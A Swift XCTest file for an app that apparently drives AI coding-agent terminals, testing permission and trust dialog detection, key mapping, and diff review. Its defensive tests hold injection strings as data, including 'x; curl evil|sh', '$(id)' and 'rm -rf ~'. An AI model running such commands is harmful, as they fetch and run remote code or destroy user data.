import XCTest
@testable import Tako

final class SafetyAndReviewTests: XCTestCase {
    private let claudeDialog = """
     Bash command
     touch tako-perm-test.txt
     Do you want to proceed?
     ❯ 1. Yes
       2. Yes, and don't ask again for touch commands in /repo
       3. No
     Esc to cancel · Tab to amend
    """

    func testDialogDetectionAndKeys() {
        XCTAssertTrue(PromptScreen.hasDialog(claudeDialog))
        XCTAssertEqual(PromptScreen.keys(for: .approve, screen: claudeDialog, kind: .claude), ["1"])
        XCTAssertEqual(PromptScreen.keys(for: .always, screen: claudeDialog, kind: .claude), ["2"])
        XCTAssertEqual(PromptScreen.keys(for: .deny, screen: claudeDialog, kind: .claude), ["3"])
    }

    func testNoDialogMeansNoKeys() {
        let idle = "⏺ Done.\n───────\n❯ \n───────"
        XCTAssertFalse(PromptScreen.hasDialog(idle))
        XCTAssertNil(PromptScreen.keys(for: .approve, screen: idle, kind: .claude))
        // An agent's own text mentioning "Do you want" without numbered options isn't a dialog.
        XCTAssertFalse(PromptScreen.hasDialog("Do you want me to continue with the refactor?"))
        // Nor is a reply asking it over a numbered list: no option has the selection cursor.
        XCTAssertFalse(PromptScreen.hasDialog("⏺ Would you like me to:\n  1. Allow it\n  2. Deny it\n───────\n❯ \n───────"))
    }

    private let claudeTrust = """
     Accessing workspace:
     /Users/me/scratch/new-project
     Quick safety check: Is this a project you created or one you trust? (Like your own code, a well-known open
     source project, or work from your team). If not, take a moment to review what's in this folder first.
     Claude Code'll be able to read, edit, and execute files here.
     Security guide
     ❯ No, exit
       Yes, I trust this folder
     Enter to confirm · Esc to cancel
    """

    func testABlankPromptLineMeansNoDraftButASuggestionDoesNot() {
        XCTAssertTrue(PromptScreen.promptLineIsBlank("⏺ Done.\n───────\n❯ \n───────", kind: .claude))
        XCTAssertFalse(PromptScreen.promptLineIsBlank("⏺ Done.\n───────\n❯ Try \"fix lint errors\"\n───────", kind: .claude))
        XCTAssertFalse(PromptScreen.promptLineIsBlank("⏺ Done.\n───────\n❯ half a mess\n───────", kind: .claude))
        XCTAssertFalse(PromptScreen.promptLineIsBlank(claudeDialog.replacingOccurrences(of: "❯", with: " "), kind: .claude), "no prompt line, no proof")
    }

    func testClaudesUnnumberedTrustPromptIsAnsweredWithTheCursor() {
        XCTAssertEqual(PromptScreen.keys(for: .approve, screen: claudeTrust, kind: .claude), ["down", "enter"])
        XCTAssertEqual(PromptScreen.keys(for: .deny, screen: claudeTrust, kind: .claude), ["esc"])
        XCTAssertNil(PromptScreen.keys(for: .always, screen: claudeTrust, kind: .claude))
        let onYes = claudeTrust.replacingOccurrences(of: "❯ No, exit\n   Yes", with: "  No, exit\n ❯ Yes")
        XCTAssertEqual(PromptScreen.keys(for: .approve, screen: onYes, kind: .claude), ["enter"])
    }

    func testTrustDialogDetection() {
        XCTAssertTrue(PromptScreen.hasTrustDialog(claudeTrust))
        XCTAssertTrue(PromptScreen.hasTrustDialog("""
        > You are running Codex in /tmp/x
          Since this folder is version controlled, you may wish to allow Codex to work in this folder without asking for approval.
        › 1. Yes, allow Codex to work in this folder without asking for approval
          2. No, ask me to approve edits and commands
        """))
        XCTAssertFalse(PromptScreen.hasTrustDialog(claudeDialog))
        XCTAssertFalse(PromptScreen.hasTrustDialog("Claude Code v2.1\n⏺ Done.\n───────\n❯ \n───────\n? for shortcuts"))
    }

    func testDevChannelWarningDetection() {
        let warning = """
         WARNING: Loading development channels

          --dangerously-load-development-channels is for local channel development only. Do not use this option to run channels you have downloaded off the internet.

          Please use --channels to run a list of approved channels.

          Channels: server:hyperterm

          ❯ 1. I am using this for local development
            2. Exit

          Enter to confirm · Esc to cancel
        """
        XCTAssertTrue(PromptScreen.hasDevChannelWarning(warning))
        // Cursor moved to Exit: Return would quit, so leave it alone.
        XCTAssertFalse(PromptScreen.hasDevChannelWarning(warning
            .replacingOccurrences(of: "❯ 1.", with: "  1.").replacingOccurrences(of: "  2. Exit", with: "❯ 2. Exit")))
        // Someone else's channel isn't Tako's to accept.
        XCTAssertFalse(PromptScreen.hasDevChannelWarning(warning.replacingOccurrences(of: "server:hyperterm", with: "server:other")))
        XCTAssertFalse(PromptScreen.hasDevChannelWarning(claudeTrust))
    }

    func testMenuIsOnlyTheBlockUnderTheCursor() {
        let screen = """
        ⏺ Plan:
          1. Normalize config
          2. Delete the cache

         Bash command
           rm -rf build
         Do you want to proceed?
           1. Yes
           2. Yes, and don't ask again for rm commands
         ❯ 3. No, and tell Claude what to do differently (esc)
        """
        XCTAssertEqual(PromptScreen.menu(screen).map(\.number), [1, 2, 3])
        XCTAssertEqual(PromptScreen.menu(screen).first?.text, "Yes")
        // Deny lands on the dialog's own "No", never the reply's "1." line.
        XCTAssertEqual(PromptScreen.keys(for: .deny, screen: screen, kind: .claude), ["3"])
        XCTAssertEqual(PromptScreen.keys(for: .approve, screen: screen, kind: .claude), ["1"])
        XCTAssertTrue(PromptScreen.menu("  1. one\n  2. two\n❯ ").isEmpty)
    }

    func testAutoModeOfferIsDeclined() {
        let offered = """
         Make auto mode your default permission mode?
         Auto mode lets Claude handle permission prompts automatically.
        ❯ Yes, set auto mode as my default permission mode
          No, keep bypass permissions
        """
        XCTAssertEqual(PromptScreen.autoModeOfferKeys(offered), ["down"])
        let onNo = offered.replacingOccurrences(of: "❯ Yes", with: "  Yes").replacingOccurrences(of: "  No, keep", with: "❯ No, keep")
        XCTAssertEqual(PromptScreen.autoModeOfferKeys(onNo), ["enter"])
        XCTAssertNil(PromptScreen.autoModeOfferKeys(claudeTrust))
    }

    func testClaudeModeFromFooter() {
        XCTAssertEqual(PromptScreen.claudeMode("❯ \n⏵⏵ bypass permissions on (shift+tab to cycle)"), .fullAccess)
        XCTAssertEqual(PromptScreen.claudeMode("❯ \n⏸ plan mode on (shift+tab to cycle)"), .plan)
        XCTAssertEqual(PromptScreen.claudeMode("❯ \n⏵⏵ accept edits on (shift+tab to cycle)"), .acceptEdits)
        XCTAssertEqual(PromptScreen.claudeMode("❯ \n? for shortcuts"), .supervised)
        XCTAssertNil(PromptScreen.claudeMode("❯ \n⏵⏵ auto mode on (shift+tab to cycle)"))
    }

    func testNamedKeyModifiers() {
        let backTab = NamedKey("shift-tab")
        XCTAssertEqual(backTab?.shift, true)
        XCTAssertEqual(backTab?.control, false)
        XCTAssertEqual(NamedKey("ctrl-c")?.control, true)
        XCTAssertEqual(NamedKey("ctrl-shift-z").map { [$0.control, $0.shift] }, [true, true])
        XCTAssertEqual(NamedKey("alt-enter")?.alt, true)
        XCTAssertNil(NamedKey("shift-"))
        XCTAssertNil(NamedKey("hyper-x"))
    }

    @MainActor
    func testTrustPromptNeedsYouAndClearsWhenAnswered() {
        let session = TerminalSession(spec: LaunchSpec(label: "api", kind: .claude, cwd: "/tmp"), resume: false)
        let store = SessionStore(previewSessions: [session], previewLayout: .focus)
        XCTAssertEqual(session.state, .starting)

        session.trustPromptSeen(true)
        XCTAssertEqual(session.state, .needsInput(TerminalSession.trustReason))
        XCTAssertEqual(session.info().state, "needs-input")
        XCTAssertFalse(session.atRest, "queued messages wait while the prompt is up")
        XCTAssertTrue(session.deliver("hello", from: "web").hasPrefix("queued"))

        // SessionStart after "Yes" keeps "needs you"; the screen clearing moves it on.
        store.applyHook(source: "claude", session: session, json: ["hook_event_name": "SessionStart"], sentAt: nil)
        XCTAssertEqual(session.state, .needsInput(TerminalSession.trustReason))
        session.trustPromptSeen(false)
        XCTAssertEqual(session.state, .idle)
    }

    @MainActor
    func testTrustPromptAnsweredBeforeAnyHookReturnsToStarting() {
        let session = TerminalSession(spec: LaunchSpec(label: "api", kind: .claude, cwd: "/tmp"), resume: false)
        session.trustPromptSeen(false)
        XCTAssertEqual(session.state, .starting, "no prompt, no change")
        session.trustPromptSeen(true)
        session.trustPromptSeen(false)
        XCTAssertEqual(session.state, .starting)
        session.apply(.registryStatus("idle"), source: "claude registry")
        XCTAssertEqual(session.state, .idle)
    }

    @MainActor
    func testTrustCheckLeavesOtherPromptsAlone() {
        let session = TerminalSession(spec: LaunchSpec(label: "api", kind: .claude, cwd: "/tmp"), resume: false)
        session.apply(.userSubmitted, source: "test", force: .needsInput("Bash: rm -rf build"))
        session.trustPromptSeen(true)
        session.trustPromptSeen(false)
        XCTAssertEqual(session.state, .needsInput("Bash: rm -rf build"))
    }

    func testSanitizeStripsEscapesAndBidi() {
        let hostile = "hi\u{1b}[201~\u{1b}]0;x\u{07}\u{202E}there\nnext"
        XCTAssertEqual(sanitizeMessage(hostile), "hi[201~]0;xthere\nnext")
    }

    func testSafeIdentifiers() {
        XCTAssertTrue(isSafeIdentifier("1f410ebd-b091-4545-bdc8-3b567e5a885f"))
        XCTAssertTrue(isSafeIdentifier("thr_9abc"))
        XCTAssertFalse(isSafeIdentifier("x; touch /tmp/pwned"))
        XCTAssertFalse(isSafeIdentifier("$(id)"))
    }

    func testShellQuote() {
        XCTAssertEqual(shellQuote("it's"), "'it'\\''s'")
        XCTAssertEqual(shellQuote("a b; rm -rf /"), "'a b; rm -rf /'")
    }

    func testResumeIgnoresUnsafeIds() {
        var spec = LaunchSpec(label: "api", kind: .claude, cwd: "/tmp")
        spec.agentSessionId = "x; curl evil|sh"
        let input = AgentIntegration.initialInput(for: spec, resume: true) ?? ""
        XCTAssertFalse(input.contains("curl"))
        // The app's own launcher, by absolute path, so agents get this build's tools.
        let launcher = shellQuote(AgentIntegration.binDirectory.appendingPathComponent("claude").path)
        XCTAssertTrue(input.hasPrefix(launcher + " --name 'api'"))
    }

    func testTaskIsQuotedIntoTheLaunchLine() {
        let spec = LaunchSpec(label: "fix", kind: .claude, cwd: "/tmp")
        let input = AgentIntegration.initialInput(for: spec, resume: false, task: "fix it; rm -rf ~") ?? ""
        XCTAssertTrue(input.contains("'fix it; rm -rf ~'"))
    }

    func testPatchParsingTracksNewLineNumbers() {
        let patch = """
        diff --git a/a.ts b/a.ts
        --- a/a.ts
        +++ b/a.ts
        @@ -10,3 +10,4 @@
         context
        -old
        +new one
        +new two
         tail
        """
        let lines = PatchLine.parse(patch)
        XCTAssertEqual(lines.first?.kind, .header)
        XCTAssertEqual(lines.first { $0.text == "context" }?.newNumber, 10)
        XCTAssertNil(lines.first { $0.text == "old" }?.newNumber)
        XCTAssertEqual(lines.first { $0.text == "new two" }?.newNumber, 12)
        XCTAssertEqual(lines.first { $0.text == "tail" }?.newNumber, 13)
    }

    func testRecapSentence() {
        let now = Date()
        let events = [
            TimelineEvent(date: now, kind: .edit, text: "Edit: a.ts"),
            TimelineEvent(date: now, kind: .edit, text: "Edit: b.ts"),
            TimelineEvent(date: now, kind: .test, text: "Tests passed: 48 passed"),
            TimelineEvent(date: now, kind: .done, text: "Added refresh rotation"),
        ]
        XCTAssertEqual(Recap.sentence(for: events), "2 edits, tests passed, finished: Added refresh rotation.")
    }

    func testTestCommandDetection() {
        XCTAssertTrue(TestCommand.matches("pnpm vitest run auth"))
        XCTAssertFalse(TestCommand.matches("git status"))
        XCTAssertEqual(TestCommand.summary(from: "stuff\n Tests  48 passed (48)\n", passed: true), "Tests  48 passed (48)")
    }

    func testDiffStatText() {
        XCTAssertEqual(DiffStat(added: 3, removed: 1, files: 1).text, "+3 −1 · 1 file")
    }

    func testUntrackedLineCountIsCapped() throws {
        let dir = FileManager.default.temporaryDirectory.appendingPathComponent(UUID().uuidString)
        try FileManager.default.createDirectory(at: dir, withIntermediateDirectories: true)
        defer { try? FileManager.default.removeItem(at: dir) }
        try Data(repeating: 0x0A, count: 300 * 1024).write(to: dir.appendingPathComponent("big.txt"))
        for index in 0..<3 { try "a\nb\n".write(to: dir.appendingPathComponent("\(index).txt"), atomically: true, encoding: .utf8) }
        let files = ["big.txt", "0.txt", "1.txt", "2.txt"]
        // The big file counts 0 lines; only the first `maxFiles` files are read.
        XCTAssertEqual(Review.untrackedLines(files, at: dir.path), 6)
        XCTAssertEqual(Review.untrackedLines(files, at: dir.path, maxFiles: 2), 2)
        XCTAssertEqual(Review.untrackedLines(files, at: dir.path, maxBytes: 1024 * 1024), 300 * 1024 + 6)
    }

    func testDiffStatCountsEveryUntrackedFile() throws {
        let dir = FileManager.default.temporaryDirectory.appendingPathComponent(UUID().uuidString)
        try FileManager.default.createDirectory(at: dir, withIntermediateDirectories: true)
        defer { try? FileManager.default.removeItem(at: dir) }
        XCTAssertNotNil(runGit(["-C", dir.path, "init", "-q"]))
        XCTAssertNotNil(runGit(["-C", dir.path, "-c", "user.name=t", "-c", "user.email=t@t", "-c", "commit.gpgsign=false", "commit", "-q", "--allow-empty", "-m", "base"]))
        try Data(repeating: 0x0A, count: 300 * 1024).write(to: dir.appendingPathComponent("big.txt"))
        try "one\n".write(to: dir.appendingPathComponent("small.txt"), atomically: true, encoding: .utf8)
        XCTAssertEqual(Review.diffStat(at: dir.path, base: nil), DiffStat(added: 1, removed: 0, files: 2))
    }

    func testSplitPatchKeysEachFile() {
        let patch = """
        diff --git a/src/a b/c.ts b/src/a b/c.ts
        index 1..2 100644
        --- a/src/a b/c.ts
        +++ b/src/a b/c.ts
        @@ -1 +1 @@
        -old
        +new
        diff --git a/logo.png b/logo.png
        Binary files a/logo.png and b/logo.png differ
        diff --git a/gone.txt b/gone.txt
        deleted file mode 100644
        --- a/gone.txt
        +++ /dev/null
        @@ -1 +0,0 @@
        -bye
        """
        let files = Review.splitPatch(patch)
        XCTAssertEqual(Set(files.keys), ["src/a b/c.ts", "logo.png", "gone.txt"])
        XCTAssertTrue(files["src/a b/c.ts"]?.hasSuffix("+new") == true)
        XCTAssertEqual(PatchLine.parse(files["gone.txt"] ?? "").filter { $0.kind == .removed }.map(\.text), ["bye"])
    }

    @MainActor
    func testBrowserAddressResolution() {
        XCTAssertEqual(resolveAddress("localhost:4123")?.absoluteString, "http://localhost:4123")
        XCTAssertEqual(resolveAddress(":3000")?.absoluteString, "http://localhost:3000")
        XCTAssertEqual(resolveAddress("example.com")?.absoluteString, "https://example.com")
        XCTAssertEqual(resolveAddress("http://x.test/a")?.absoluteString, "http://x.test/a")
        XCTAssertEqual(resolveAddress("how do flexbox gaps work")?.host(), "www.google.com")
    }
}
